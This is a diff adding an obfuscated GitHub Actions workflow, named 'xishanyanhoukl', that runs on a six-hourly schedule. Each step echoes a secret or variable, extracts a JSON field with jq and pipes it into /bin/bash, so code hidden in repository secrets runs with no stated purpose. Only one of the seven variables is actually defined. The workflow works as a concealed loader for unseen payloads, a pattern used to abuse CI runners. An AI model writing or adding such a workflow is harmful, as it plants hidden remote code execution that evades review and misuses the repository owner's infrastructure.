@@ -1,0 +1,23 @@
+name: xishanyanhoukl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xishanyanhoukl
+        env:
+          x7624: ${{ secrets.x7624 }}
+        run: |
+          echo $x7624 | jq -r .wpo3 | /bin/bash
+          echo $ch22 | jq -r .h6023 | /bin/bash
+          echo $uvrlg47950 | jq -r .wasv8 | /bin/bash
+          echo $v04495 | jq -r .m05408 | /bin/bash
+          echo $egm5694 | jq -r .gv11 | /bin/bash
+          echo $ve71949 | jq -r .tpoo9426 | /bin/bash
+          echo $fn28 | jq -r .vi096 | /bin/bash
+
